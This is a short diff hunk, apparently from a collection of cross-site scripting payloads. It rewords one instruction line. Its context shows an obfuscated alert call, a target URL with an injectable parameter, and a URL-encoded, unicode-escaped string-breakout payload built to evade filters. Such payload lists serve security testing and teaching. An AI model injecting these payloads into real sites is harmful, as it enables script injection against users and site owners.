@@ -82,7 +82,7 @@ this[8680439..toString(30)](document.domain)
 
 📎 Go to: http://untrusted.sudo.co.il/iframe.php?p=
 
-Paste the following encoded payload:
+Paste the following encoded payload formate unicode:
 
 %27%3Bal%5Cu0065rt%28m%29%3B%2F%2F
 
